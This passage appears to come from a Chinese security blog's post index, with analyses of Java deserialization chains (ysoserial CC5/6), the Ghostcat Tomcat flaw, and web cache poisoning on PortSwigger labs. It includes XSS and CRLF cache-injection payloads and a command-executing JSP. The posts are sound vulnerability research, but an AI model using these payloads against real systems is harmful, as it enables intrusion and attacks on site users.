Spacemacs 环境下的安装过程。\n① 下载 EAF\ngit clone --depth=1 -b master https://github.com/manateelazycat/emacs-application-framework.git ~/.emacs.d/private/local/emacs-application-framework/ ② 安装 python 依赖\ncd ~/.emacs.d/private/local/emacs-application-framework/ node install-eaf-win32.js 如果安装有问题先检查一下 pip 能不能访问到服务器，连接超时的话一般是代理的锅。\n脚本最后会下载一个视频解码器 K-Lite Codec Pack，如果不打算用 Emacs 看视频就可以 Ctrl-C 了。\n③ 安装 Elisp 依赖\n下载安装 emacs-ctable、emacs-deferred、emacs-epc，不过新版 Emacs 好像作为依赖安装好了，反正我是跳过了这一步。\n④ 添加配置\n(add-to-list 'load-path \u0026quot;~/.emacs.d/private/local/emacs-application-framework/\u0026quot;) (require 'eaf) 我的配置，以后能想起来就更新一下。 ;; EAF (use-package eaf :load-path \u0026quot;~/.emacs.d/private/local/emacs-application-framework\u0026quot; ; Set to \u0026quot;/usr/share/emacs/site-lisp/eaf\u0026quot; if installed from AUR :init (use-package epc :defer t :ensure t) (use-package ctable :defer t :ensure t) (use-package deferred :defer t :ensure t) (use-package s :defer t :ensure t) :custom (eaf-browser-continue-where-left-off t) :config (setq eaf-fullscreen-p t) (eaf-setq eaf-browser-enable-adblocker \u0026quot;true\u0026quot;) (eaf-setq eaf-browser-dark-mode \u0026quot;false\u0026quot;) (setq browse-url-browser-function 'eaf-open-browser) (defalias 'browse-web #'eaf-open-browser) (eaf-bind-key nil \u0026quot;M-q\u0026quot; eaf-browser-keybinding)) ;; unbind, see more in the Wiki ;; eaf-evil (require 'eaf-evil) (setq eaf-evil-leader-keymap spacemacs-cmds) (define-key key-translation-map (kbd \u0026quot;SPC\u0026quot;) (lambda (prompt) (if (derived-mode-p 'eaf-mode) (pcase eaf--buffer-app-name (\u0026quot;browser\u0026quot; (if (string= (eaf-call-sync \u0026quot;call_function\u0026quot; eaf--buffer-id \u0026quot;is_focus\u0026quot;) \u0026quot;True\u0026quot;) (kbd \u0026quot;SPC\u0026quot;) (kbd eaf-evil-leader-key))) (\u0026quot;pdf-viewer\u0026quot; (kbd eaf-evil-leader-key)) (\u0026quot;image-viewer\u0026quot; (kbd eaf-evil-leader-key)) (_ (kbd \u0026quot;SPC\u0026quot;))) (kbd \u0026quot;SPC\u0026quot;)))) ;; eaf-org (require 'eaf-org) (defun eaf-org-open-file (file \u0026amp;optional link) \u0026quot;An wrapper function on `eaf-open'.\u0026quot; (eaf-open file)) ;; use `emacs-application-framework' to open PDF file: link (add-to-list 'org-file-apps '(\u0026quot;\\\\.pdf\\\\'\u0026quot; . eaf-org-open-file)) https://github.com/manateelazycat/emacs-application-framework/wiki/Hacking\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2021-04-02","permalink":"https://zrquan.github.io/posts/eaf/","tags":["emacs"],"title":"Emacs Application Framework"},{"content":"在之前 CommonsCollections1 的文章中有分析怎么利用几个 Transformer 类来执行系统命令，以及通过 LazyMap#get 来触发。所以本文不再赘述这一部分内容，只要知道最终目的是执行 LazyMap#get 方法就行了。\nCommonsCollections5 这条链需要用到 BadAttributeValueExpException 中重写的 readObject 方法，我搜了一下没找到这个方法具体是在哪个版本加上去的，下面测试用的是 JDK 8u212 。\n首先看一下 getObject 方法：\n前面构造 transformerChain 的过程和 cc1 一样，触发点同样在 lazyMap#get 方法中。区别主要在红框的部分——生成 TiedMapEntry 对象，并将 lazyMap 赋值给它的 map 属性；然后创建 BadAttributeValueExpException 对象，通过反射将 TiedMapEntry 对象赋值给它的私有属性 val。\n在进行反序列化时，执行 BadAttributeValueExpException 重写的 readObject 方法：\n如果没有开启安全管理器(System.getSecurityManager() == null)，会执行 TiedMapEntry#toString 方法。TiedMapEntry 的关键方法如下：\npublic Object getValue() { return this.map.get(this.key); } ... public String toString() { return this.getKey() + \u0026quot;=\u0026quot; + this.getValue(); } 可见最终会执行我们构造的 lazyMap 的 get 方法，导致命令执行。\nCommonsCollections6 前半段和上面一样，先构造一个 TiedMapEntry 类对象，想办法触发它的 getValue 或者 toString 方法。\n首先创建一个 HashSet 类对象，通过反射拿到它的私有属性 map：\n这个 map 属性是 HashMap 类的，再通过反射获取其 table 属性：\n获取数组的第一个非空元素 node，将构造好的 TiedMapEntry 对象赋值给它的 key 属性：\n构造好的 HashSet 对象结构如下：\n从上图可以看到 map 和 table 两个都是 transient 属性，也就是不会被序列化，那设置它们有什么意义呢？我们看一下 HashSet#writeObject 方法：\nprivate void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException { // Write out any hidden serialization magic s.defaultWriteObject(); // Write out HashMap capacity and load factor s.writeInt(map.capacity()); s.writeFloat(map.loadFactor()); // Write out size s.writeInt(map.size()); // Write out all elements in the proper order. for (E e : map.keySet()) s.writeObject(e); } 关键在最后的 for 循环，主动将我们构造的 TiedMapEntry 对象写到输出流中，所以不受 transient 的影响。\n反序列化 HashSet 时，在 readObjet 方法的最后会获取 TiedMapEntry 对象(key)，将它添加到一个 HashMap 中。\n跟进发现会通过 key.hashCode() 获取 key 的哈希值，而在 TiedMapEntry#hashCode 方法中触发了 lazyMap#get 方法：\n最终导致命令执行。\n总结 之所以把 cc5 和 cc6 两条链放在一起讲，是因为它们和 cc1 一样都利用 ChainedTransformer 构造反射链来执行命令，而且都利用了 TiedMapEntry 类。\n链的前半部分逻辑就比较简单了，比较有趣的知识点是 HashSet 的 writeObject 方法会序列化它的所有 key，而 HashMap 的 writeObject 会序列化它的所有 key 和 value，所以即使属性用 transient 修饰也不影响利用。\n","date":"2021-04-01","permalink":"https://zrquan.github.io/posts/ysoserial-cc56/","tags":["java","deserialize"],"title":"Ysoserial-CommonsCollections5/6"},{"content":"编号：CNVD-2020-10487/CVE-2020-1938\n描述：由于 Tomact AJP 协议的设计缺陷，攻击者可以通过漏洞读取 webapp 目录下的任意文件，或者通过文件包含 getshell。\n影响版本：Tomcat 9/8/7/6\nTomcat Connector Connector 是 Tomcat 用来处理外部连接的核心组件，它将底层的 socket 信道封装成 Request 和 Response 两个对象，再交给 Container(servlet 容器)进行处理。\nConnector 的源码在 org.apache.coyote 目录下，默认有两个——分别处理 HTTP 协议和 AJP 协议。\nApache Jserv Protocol AJP 协议可以简单理解为 HTTP 协议的二进制性能优化版本，它能降低 HTTP 请求的处理成本，因此主要在需要集群、反向代理的场景被使用，默认开放在 8009 端口。\n浏览器无法直接处理 AJP 协议，所以通常用于 Tomcat 和其他 web 服务器的通信，比如 Apache 的 proxy_ajp 模块就可以代理 AJP 协议。\nPOC 部署好环境后，在 github 找个脚本复现一下漏洞。\n可见通过 AJP 协议请求 /asdf 路径，却读取了 web.xml 文件的内容。\n用 wireshark 看一下 AJP 请求的内容：\n红框中的三个由用户控制的参数就是导致文件读取的罪魁祸首，下面通过调试 Tomcat 看看怎么处理它们的。\n文件读取 处理请求的类是 org.apache.coyote.ajp.AbstractAjpProcessor ，进入 prepareRequest 方法，这里是漏洞的入口点，此时的调用栈如下：\n来到关键的 while 语句，在这里对上面提到的三个参数进行设置：\nrequest.setAttribute() 就是简单的 HashMap 赋值操作，循环结束后 attributes 属性如下：\nAJP Connector 封装好 request 对象后，会将其传给 Container 处理。\nContainer 即 servlet 容器，相关设置可以在 web.xml 文件找到，下面是默认开启的两个 servlet 容器：\n\u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;default\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.apache.catalina.servlets.DefaultServlet\u0026lt;/servlet-class\u0026gt; ... \u0026lt;/servlet\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;jsp\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.apache.jasper.servlet.JspServlet\u0026lt;/servlet-class\u0026gt; ... \u0026lt;/servlet\u0026gt; \u0026lt;!-- The mapping for the default servlet --\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;default\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;!-- The mappings for the JSP servlet --\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;jsp\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.jsp\u0026lt;/url-pattern\u0026gt; \u0026lt;url-pattern\u0026gt;*.jspx\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; 当请求目标的后缀是 jsp 或者 jspx 时由 JspServlet 处理请求，其他情况则由 DefaultServlet 处理。因此为了确保由 DefaultServlet 处理我们的请求，而使用 /asdf 这种大概率不存在的路径。\n代码执行到 DefaultServlet#doGet 方法中：\n一直跟进到 getRelativePath 方法，关键代码如下：\n上图的第一个 if 语句拼接了 path_info 和 servlet_path 参数得到 /WEB-INF/web.xml ，而进入 if 的条件是 request_uri 不为空(不一定要是 /)，这就是 poc 设置该参数的原因。\n获取路径后调用 getResource 方法读取文件：\n红框中的 validate 方法用来检查文件的路径，确保路径以 / 开头，且不会跨越到 webapp 目录以外。代码如下：\n从上图可以看到代码会校验路径是否以 / 开头，且标准化了路径分隔符，但是怎么防止目录穿越呢？在处理路径分隔符的部分调用了 RequestUtil#normalize 方法，我们跟进一下：\n方法开头会替换 windows 系统的 \\\\ ，然后根据情况在开头和末尾加上 / ，在后面执行以下 while 语句：\nwhile (true) { int index = normalized.indexOf(\u0026quot;/../\u0026quot;); if (index \u0026lt; 0) { break; } if (index == 0) { return null; // Trying to go outside our context } int index2 = normalized.lastIndexOf('/', index - 1); normalized = normalized.substring(0, index2) + normalized.substring(index + 3); } 上述代码会将 /../ 和前一个目录名抵消，如果最后 /../ 出现在开头，即尝试逃出 webapp 目录，就会返回 null。理解这段代码的关键在于理解 lastIndexOf 方法，它返回第一个参数字符串最后出现的位置，第二个参数是表示位置的整数，可以理解为”只搜索该位置前的内容“。\n\u0026quot;aaabbbaaa\u0026quot;.lastIndexOf(\u0026quot;aaa\u0026quot;); // 6 \u0026quot;aaabbbaaa\u0026quot;.lastIndexOf(\u0026quot;aaa\u0026quot;, 4); // 0 校验完路径后，返回 getResource 方法读取文件资源。\n文件包含 前面说过 Tomcat 默认的 servlet 容器有两个，当访问的是 jsp 文件时会由 JspServlet 来处理请求。这个处理实际就是解析 jsp 文件，但前提是这个 jsp 文件是存在的，所以首先要想办法上传到 webapp 目录下。\n我们先在 webapp 目录下创建一个 test.jsp：\n\u0026lt;%Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;);%\u0026gt; 修改一下 poc，发送的 AJP 请求如下：\nAJP Connector 的处理和之前类似，我们直接跟进到 JspServlet 类中。这次处理请求的方法是 service，关键代码如下：\n这里拼接 path_info 和 servlet_path 参数得到文件路径，接着调用 serviceJspFile 方法解析目标 jsp 文件。\n所以找到目标文件的关键在于 path_info 和 servlet_path 参数，如果上传的 jsp 文件在 upload 目录下，servlet_path 就要设置为 /upload/ ，而 URL 的路径并不重要，只要后缀是 jsp 或者 jspx 即可。\n再跟进一下 serviceJspFile 方法：\n在 JspServletWrapper#service 方法中编译好目标 jsp 文件，获取对应的 servlet 对象，再执行它的 service 方法弹出计算器。\n总结 导致文件读取漏洞的是 AJP 请求中的三个用户可控参数：\njavax.servlet.include.request_uri：不为空即可 javax.servlet.include.path_info：文件名 javax.servlet.include.servlet_path：根路径 而当请求资源是 jsp 或 jspx 文件时，由于 JspServlet 类会编译执行目标文件，导致文件包含漏洞，不过前提是能把恶意文件上传到 webapp 目录下。\n","date":"2021-03-25","permalink":"https://zrquan.github.io/posts/ghostcat/","tags":["cve"],"title":"Ghostcat漏洞分析"},{"content":" Web Cache 101 Web 缓存技术的应用其实非常普遍，只是它对于用户来说比较透明，容易被忽略。使用缓存的目的是加快资源文件的访问速度，让用户浏览页面更加流畅，同时减轻 Web 服务器的负载。无论是 CDN、负载均衡、反向代理，甚至一些开发框架，都会使用缓存技术，缓存的对象一般是不怎么改动而且可以公开访问的文件，比如 javascript、css、图片之类。\n除了服务端，浏览器也有自己的缓存机制，可以将数据保存在本地方便快速加载，不过本文谈及的缓存不包括这一类型。\n缓存键 缓存服务器备份了资源后，需要判断接下来的请求是否命中缓存，如果请求的内容已经在缓存中了，就直接返回给用户，否则转发请求给 Web 服务器，并缓存它的响应。\n那么如何判断请求是否命中缓存呢？全文匹配肯定不太合理，因为即使访问的资源相同，请求也可能有很多差异，比如时间戳、cookie、随机值等等。一般可以通过 URL、Host、请求方法等特征点结合起来判断，称之为缓存键(cache keys)。只要缓存键匹配，其他内容即使有差异，也视为命中缓存。\n请求中的一些输入虽然没有作为缓存键，但也可能影响响应的内容，那么就可能产生一些问题。比如以下两个请求，它们的键相同(URL 和 Host 头)，但 Cookie 不同：\nGET /blog/post.php?mobile=1 HTTP/1.1 Host: example.com User-Agent: Mozilla/5.0 … Firefox/57.0 Cookie: language=pl; Connection: close GET /blog/post.php?mobile=1 HTTP/1.1 Host: example.com User-Agent: Mozilla/5.0 … Firefox/57.0 Cookie: language=en; Connection: close 缓存服务器对第一个请求的响应进行缓存后，由于第二个请求命中了缓存，缓存服务器直接返回第一个请求的响应，导致页面的语言不正确。这里的 cookie 可以称为非键输入(unkeyed input)。\nCache-Control Cache-Control 是用来控制缓存策略的响应头，它的值由一个或多个缓存指令构成。比如下述响应头包含两个指令：\nCache-Control: public, max-age=60 其中 public 表示任意缓存服务器都可以备份响应内容， max-age=60 表示 60 秒后需要更新缓存。\nTable 1: 常见的 Cache-Control 指令 指令 描述 public 任何缓存都可以存储响应的副本 private 只有响应的最终接收者(客户端或浏览器)才可以存储该响应的副本 max-age 定义缓存的过期时间(单位是秒) no-store 禁止对响应进行缓存 no-cache 先检查 web 服务器，如果内容没有更新则继续使用缓存(304) must-revalidate 和 max-age 一起使用，设置一个时间，在该时间内 no-cache 不需要验证 web 服务器的内容 immutable 告诉浏览器文件有无可变内容的指令，如果内容无更新，则永远不会重新验证缓存 缓存投毒 上文提到，在一个 http 请求中，除了缓存键外的部分可以称为非键输入，它们不会影响判断缓存是否命中。如果非键输入可以影响响应，那意味着我们可以一定程度上控制缓存服务器备份的内容，从而影响其他用户访问该资源时的行为，这就是缓存投毒。\n挖掘缓存投毒漏洞的方法1：\n找到可以影响响应的非键输入； 研究非键输入的作用，能否作为某种攻击的输入点； 尝试将它写入到缓存中。 响应是否被缓存受多种因素影响——文件扩展名，内容类型，路由，状态代码和响应头等。同时，在研究非键输入的影响时，缓存的响应可能干扰我们的判断，所以要使用 cache buster(即在缓存键中放一段随机字符串)，确认得到 web 服务器的响应，还能避免影响正常用户。\n下面通过 portswigger 提供的靶场，说明缓存投毒的一些利用方式。\nxss in headers 一般我们遇到的反射型 xss，输入点都是再 GET 参数中，通过诱导受害者访问恶意链接来触发 payload。如果在一个请求头中存在 xss 的点我们很难去利用，因为没办法控制受害者的请求头。\n但结合缓存投毒之后，我们只需要自己发送 payload 来毒化缓存，当其他用户正常访问资源就会受到攻击。\n如下图所示，应用通过 X-Forwarded-Host 头来获取地址，导入 js 资源，而且没有任何过滤：\n当一个正常用户访问上面的地址，返回的却是带有 xss payload 的页面：\nURL 后面的 ?x 是为了确保请求不会命中缓存而添加的 cache buster，可以看到响应中 X-Cache 为 miss。\nxss in cookie 和请求头一样，cookie 中的 xss 输入点也是很难利用的，但缓存投毒可以大大增加其危害性。不过 cookie 中的缓存投毒很容易被开放人员注意到，因为很可能导致各种 bug。\n如下图，响应中拼接了 cookie 的一个参数值导致 xss，投毒后可以攻击任意访问该资源的用户：\n重定向攻击 除了 xss 外，任意地址重定向也是一种利用方式。下述的应用强制用户使用 https，如果 X-Forwarded-Scheme 不是 https 则返回 302 重定向：\nGET /random HTTP/1.1 Host: innocent-site.com X-Forwarded-Scheme: nothttps HTTP/1.1 301 moved permanently Location: https://innocent-site.com/random 在这个请求中，我们可以控制跳转目标的 path，再枚举请求头发现 X-Forwarded-Host 可以控制跳转的 host。\n根据题目我们需要成功实施 XSS 攻击，那么就要利用重定向来引入恶意 js 文件。\n首先找一个网站会正常导入的 js 文件 /resources/js/tracking.js ，通过缓存投毒让对该文件的访问重定向到恶意服务器的同名文件上。\n注意恶意服务器需要支持 https，可以用 python 快速搭建一个：\nfrom http.server import HTTPServer, SimpleHTTPRequestHandler, HTTPStatus import ssl # given a pem file ... openssl req -new -x509 -keyout yourpemfile.pem -out yourpemfile.pem -days 365 -nodes httpd = HTTPServer(('0.0.0.0', 443), SimpleHTTPRequestHandler) httpd.socket = ssl.wrap_socket (httpd.socket, server_side=True, certfile='yourpemfile.pem') httpd.serve_forever() 然后刷新一下网页，可以看到它从恶意服务器请求 js 文件：\ndom xss 如果找不到直接的 xss 注入点，也没办法控制 js 文件的来源，可以考虑从 dom xss 入手。现在的 web 页面内容很多都是在访问时动态加载更新的，比如访问 json 文件来获取数据，更新到现有的 dom 树上。\n首先分析应用的前端代码，找到 dom 注入点：\n从上图可以看到 j.contry 属性是一个攻击点，它从一个远程 json 文件中获取，如果能控制这个 json 文件就能写入 payload。\n在主页找到 initGeoLocate 函数调用，发现参数是动态拼接的，经过测试知道可以通过 X-Forwarded-Host 来控制：\n才发现靶场提供了 exploit server 让用户部署 payload 文件，在靶场上方有按钮可以打开。\n部署一个恶意的 geolocate.json 文件，记得设置 https 和 Access-Control-Allow-Origin，不然会拒绝跨域请求。\n注意 payload 不能使用 \u0026lt;script\u0026gt; ，因为页面加载完已经错过它的执行阶段了，需要通过 html 事件来触发 payload。\n接着就是向缓存投毒，成功后刷新主页。应用会访问恶意 json 文件并调用 innerHTML 函数将 payload 更新到 dom 树上，触发弹窗。\nVary header 简单地说，Vary 响应头可以指定额外的请求头作为缓存键的一部分，利用 Vary 头我们可以做到更精确、更有针对性的缓存投毒攻击。\n比如当 Vary 头指定了 User-Agent 作为缓存键，我们可以通过控制 User-Agent 来攻击使用特定浏览器的用户。\n缓存纠缠 在上一章节，我们进行缓存投毒攻击时，第一步是先找到非键输入，因为在缓存键中写入 payload，即使可以影响响应，正常用户的请求也不会命中该缓存。\n但总有些应用会对客户端输入进行各种处理，使得本来应该是缓存键的输入被排除在外，这就产生了更多的途径来进行缓存投毒。\n挖掘缓存纠缠漏洞的方法2：\n首先需要找到一个页面，可以通过它判断响应有没有被缓存，比如：\n通过响应头判断，X-Cache 之类的； 通过响应内容的区别来判断； 通过响应时间判断(不太可靠)。 如果响应中没有包含可以判断缓存是否生效的特征，比如 X-Cache、参数反射等，我们可以通过响应的差异去判断。但这个方法有个问题是会被缓存所干扰，我们不知道是在和缓存服务器还是 web 服务器通信，所以需要加上 cache buster 排除干扰。\n在能够确认请求是否命中缓存的前提下，研究服务端对缓存键的处理方式，看看有没有被排除的输入。\n一些常见的情况：\n排除所有请求参数； 排除个别请求参数； 进行标准化处理。 最后找到可以利用的 gadget 来攻击其他用户，通常是反射型 xss、任意重定向之类需要诱导用户访问的漏洞，进行缓存投毒后只要用户正常浏览页面就会被攻击。\n下面通过 portswigger 提供的靶场，说明一些导致缓存纠缠的情况，以及利用方式。\n排除请求参数 下图对修改了请求参数后的响应进行比较，通过响应中 X-Cache 头和反射的参数，都可以判断请求参数不在缓存键中：\n所以可以通过请求参数毒化缓存，使其他用户受到 XSS 攻击。\n排除个别参数 和上一个例子差不多，不过找到个别没有加进缓存键的参数需要花点时间。可以使用 param-miner 的 Guest GET parameters 功能来枚举：\n然后修改一下 utm_content 参数，看看是否可以命中之前响应的缓存，如果可以命中说明它不是缓存键。在该参数写入 xss payload 进行缓存投毒：\n参数伪装 有时候存在漏洞的参数刚好也是缓存键，是不是就无法利用了呢？方法还是有的，不过条件很苛刻。\n利用 web 服务器和缓存解析参数时的差异，可以将输入从缓存键排除。比如下面的例子：\nGET /?example=123?excluded_param=\u0026lt;svg/onload=alert(1)\u0026gt; 一般情况下问号出现在 GET 参数最开头，但有些应用不管问号在哪，都会认为它后面跟着的是一个参数。比如例子中请求行有两个问号，web 服务器会把第二个问号看作 example 参数的一部分，而缓存服务器则认为有 example 和 excluded_param 两个参数。那么当用户请求 /?example=123 就会被攻击。\n还有另外一种情况，web 服务器支持多个参数分隔符而缓存服务器不支持。比如下面的请求：\nGET /?keyed_param=abc\u0026amp;excluded_param=123;keyed_param=\u0026lt;svg/onload=alert(1)\u0026gt; web 服务器把分号看作参数分隔符，并取最后一个同名参数的值，而缓存服务器把分号当作参数值的一部分。由于 excluded_param 不是缓存键，当用户请求 /?keyed_param=abc 时就会被攻击，起到在缓存键(参数)中投毒的效果。\n在下述应用中，存在一个非缓存键参数 utm_content(可以通过 param-miner 找到)，且 web 服务器会用分号来分隔参数，利用这个特性可以进行参数伪装。\n在日志中找到一个 jsonp 请求，用 callback 参数的值作为函数名：\n由于 callback 参数是缓存键，不能直接投毒，但是可以利用 utm_content 完成参数伪装。\nFat GET Fat GET 指带有请求体的 GET 请求，请求体中的参数在一些网站中会被正常处理，而且很可能不包含在缓存键中。\n同理 POST 请求也可以进行缓存投毒。\n静态资源 通过向毒化静态资源文件(js、css 等)执行恶意代码，不过这些资源文件反射请求参数的情况非常少见，就一笔带过了。\ncase1：\nGET /style.css?excluded_param=123);@import… HTTP/1.1 HTTP/1.1 200 OK … @import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@import… case2：\nGET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1 HTTP/1.1 200 OK Content-Type: text/html … This request was blocked due to…alert(1){}*{color:red;} 缓存键标准化 如果缓存服务器对请求参数做了一些解码处理，我们可以通过缓存投毒让无法利用的反射型 xss 生效。\n一般浏览器发送的特殊字符都会进行 URL 编码，如果应用没有对其进行解码，即使在响应中返回也无法构成 xss 攻击。但如果缓存服务器在比较缓存键时进行了解码操作，比如让下面的两个请求命中同一缓存：\n1. GET /example?param=\u0026quot;\u0026gt;\u0026lt;test\u0026gt; 2. GET /example?param=%22%3e%3ctest%3e 那我们可以用 burp 发送未编码的 payload 进行投毒，然后诱导用户访问恶意 url。即使浏览器发送了编码后的请求，也会受到 xss 攻击。\n下面的例子中，浏览器会将我们的 payload 编码：\n为了执行代码，我们用 burp 发送未编码的 payload，并让它进入缓存：\n当其他用户访问恶意 URL 时，即使浏览器对 payload 进行了编码，但由于缓存服务器的处理使它仍然命中带有恶意代码的缓存：\n缓存键注入 缓存键包括请求中的多个部分，而且经常会简单地进行字符串拼接后做比较。在知道了不同参数的分隔符的前提下，可以通过注入让两个不同的请求具有相同的缓存键。\n如下图，Origin 头中存在 xss 漏洞，但 Origin 头是缓存键的一部分，没办法直接投毒。\nGET /path?param=123 HTTP/1.1 Origin: '-alert(1)-'__ HTTP/1.1 200 OK X-Cache-Key: /path?param=123__Origin='-alert(1)-'__ \u0026lt;script\u0026gt;…'-alert(1)-'…\u0026lt;/script\u0026gt; 通过枚举或者回显等方式，得知上述请求的缓存键用 __ 作为分隔符后，可以通过以下请求触发反射型 xss(命中恶意缓存)：\nGET /path?param=123__Origin='-alert(1)-'__ HTTP/1.1 HTTP/1.1 200 OK X-Cache-Key: /path?param=123__Origin='-alert(1)-'__ X-Cache: hit \u0026lt;script\u0026gt;…'-alert(1)-'…\u0026lt;/script\u0026gt; Lab: Cache key injection 下述的题目涉及到包括缓存键注入在内的多个漏洞，可以用 Pragma: x-get-cache-key 头来显示缓存键。\n打开网页后观察一下日志记录，红框标出了 lang 参数的传递过程：\n首先分析一下 localize.js 请求，当 cors 参数为 1，响应会反射请求中的 Origin 头：\n利用 CRLF 攻击修改响应：\n这里利用到了缓存键注入攻击，上图显示的缓存键是：\n/js/localize.js?lang=en\u0026amp;cors=1$$Origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1) URL 和 Origin 间使用 $$ 连接，就算没有发送 Origin 头，缓存键后面也会加上连接符。所以为了命中这个缓存键，要在上图的 Origin 后面加上 $$ ，那么得到的缓存键就是：\n/js/localize.js?lang=en\u0026amp;cors=1$$Origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$ 只要访问这个 URL 时删掉后面的 $$ ，就会得到已经被缓存 alert(1) 。\n那么下一步要解决的是怎么让正常请求访问到这个 URL，我们知道在 login 页面会导入 localize.js，但测试之后发现无法毒化这个页面，而且它导入 localize.js 时会在后面加上 cors=0 ，使 CRLF 攻击失效。\n留意一下流量日志，可以发现访问 /login 会被重定向到 /login/ ，而且我们可以控制路径和参数，那么自然想到利用前文的重定向攻击。\n但是 lang 参数是缓存键，我们要先找到其他可以投毒的参数。用 param-miner 枚举后发现 utm_content 不在缓存键中，而且由于缓存服务器对问号的处理存在问题，可以进行参数伪装。示意图如下：\n结合之前 CRLF 攻击，构造出 payload：\n/login?lang=en?utm_content=x%26cors%3d1$$Origin%3dx%250d%250aContent-Length%3a%25208%250d%250a%250d%250aalert(1)%23 后面的 %23(#) 是为了注释掉导入 localize.js 时末尾添加的 cors=0 。\nDONE：\n攻击内部缓存 一些开发框架实现了缓存功能，在这种缓存和应用在同一服务器的情况下，可以避免上述的很多由服务器差异化引起的缓存纠缠漏洞。而且和单独的缓存服务器不同，应用缓存的对象很可能不是完整的响应，而是多个频繁使用的片段。\n在这种情况下，也就没有所谓的缓存键了，因为一个请求可以对应多个缓存资源，这也让投毒变得很方便。但难点在于怎么判断应用缓存的存在，以及缓存的内容。\n如果响应中包含了当前请求的内容以及旧请求的内容，又或者响应中出现了你在其他请求发送的内容，那么很可能使用了应用缓存。\n另外测试应用缓存时要谨慎，因为没有 cache buster，很容易影响到正常用户 👈\nhttps://portswigger.net/research/practical-web-cache-poisoning\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://portswigger.net/research/web-cache-entanglement\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2021-03-16","permalink":"https://zrquan.github.io/posts/web-cache/","tags":["web"],"title":"缓存投毒"},{"content":"RMI 101 RMI(Remote Method Invocation)即远程方法调用，是一种分布式对象通信技术，它使客户机中的程序可以像调用本地对象一样调用远程服务机的对象方法，而不需要关心网络通信的细节。\nJava RMI 的远程通信过程中分为 client 和 server，而在两端的程序中，负责处理通信细节的对象分别称为 stub 和 skeleton。也就是说，程序调用一个远程对象的方法时，实际是由 stub 对象获取相关信息并向 skeleton 发送请求，skeleton 对象获取到结果后再返回给 stub 对象，最后返回到我们的代码中。\n此外，并不是 JVM 中的所有对象都能被远程调用的，一个能被远程调用的对象需要实现一个继承了 Remote 接口的接口，并且在 Registry(注册中心)注册服务。Client 端在 Registry 查询远程对象并获取 stub 后，才能直接和 Server 端进行通信。\n代码分析 示例代码 下面通过简单的示例代码，来实现 RMI 远程方法调用，使用的版本是 jdk1.7.0_02\n首先需要定义一个可以被远程调用的类，它要继承 Remote 接口。Remote 接口是一个空接口，和 Serializable 接口一样起到标记的作用，说明实现它的类可以被远程调用，其中的方法需要抛出 RemoteException 异常。\ninterface User extends Remote public interface User extends Remote { void register(String uname) throws RemoteException; boolean login(String pwd) throws RemoteException; String getName() throws RemoteException; } class UserImpl // java.rmi.server.UnicastRemoteObject的构造函数将生成stub和skeleton public class UserImpl extends UnicastRemoteObject implements User { String name; // 必须有一个显式的构造函数，并且要抛出RemoteException异常 public UserImpl() throws RemoteException {}; @Override public void register(String uname) throws RemoteException { this.name = uname; System.out.println(\u0026quot;Register called: username is \u0026quot; + uname); } @Override public boolean login(String pwd) throws RemoteException { System.out.println(\u0026quot;Login succeed, password is \u0026quot; + pwd); return true; } @Override public String getName() throws RemoteException { return this.name; } } 接着是 Server 端的实现类，在此创建一个注册表(Registry)并绑定远程对象。\nclass UserServer public class UserServer { public static void main(String[] args) throws Exception{ // 默认端口是tcp 1099 Registry registry = LocateRegistry.createRegistry(3333); registry.bind(\u0026quot;User\u0026quot;, new UserImpl()); System.out.println(\u0026quot;RMI server is ready.\u0026quot;); } } 实际上 Registry 和 Server 是不同的实体，你可以在不同的类(文件)中创建，在低版本的 JDK 中甚至可以放在不同的服务器上，但高版本的 JDK 会进行检测，如果不在同一台服务器就无法注册成功。\n最后是 Client 端的实现类，它需要先获取注册表的引用，再通过注册表获取远程对象。由于要调用远程对象的方法，所以 Client 端也需要有该对象的接口定义。\nclass UserClient public class UserClient { public static void main(String[] args) throws Exception{ Registry registry = LocateRegistry.getRegistry(3333); User userClient = (User) registry.lookup(\u0026quot;User\u0026quot;); userClient.register(\u0026quot;zrquan\u0026quot;); userClient.login(\u0026quot;123\u0026quot;); System.out.println(\u0026quot;Username is \u0026quot; + userClient.getName()); } } Register 获取注册中心有两种方式——一种是 LocateRegistry.createRegistry() ，在创建时从本地获取；另一种是 LocateRegistry.getRegistry() ，可以远程获取注册中心。在上述代码中， server 端使用的是第一种方式，所以我们先跟进 createRegistry 方法。\n方法实际返回的是一个 RegistryImpl 对象，初始化该对象时执行其私有方法 setup()\n在上图的 LiveRef 对象中包含 IP、端口等信息，并封装进 UnicastServerRef 对象，然后执行 UnicastServerRef 的 exportObject 方法，生成 stub 和 skel 对象。\n对照 UnicastServerRef 对象的成员变量和调用栈，可以看到经过几个 exportObject 方法之后执行到 TCPTransport 的 listen 方法中。\n上图的 225 行调用 TCPEndpoint.newServerSocket() 后开启端口监听，227 行调用 start 启动线程，执行 TCPTransport$AcceptLoop 的 run 方法。\n执行到 ServerSocket.accept() 后程序阻塞，等待 server 端或 client 端的请求。\n接下来分析一下 LocateRegistry.getRegistry() ，它有几个重载方法，具体的实现在以下方法中：\npublic static Registry getRegistry(String host, int port, RMIClientSocketFactory csf) throws RemoteException { Registry registry = null; if (port \u0026lt;= 0) port = Registry.REGISTRY_PORT; if (host == null || host.length() == 0) { try { host = java.net.InetAddress.getLocalHost().getHostAddress(); } catch (Exception e) { host = \u0026quot;\u0026quot;; } 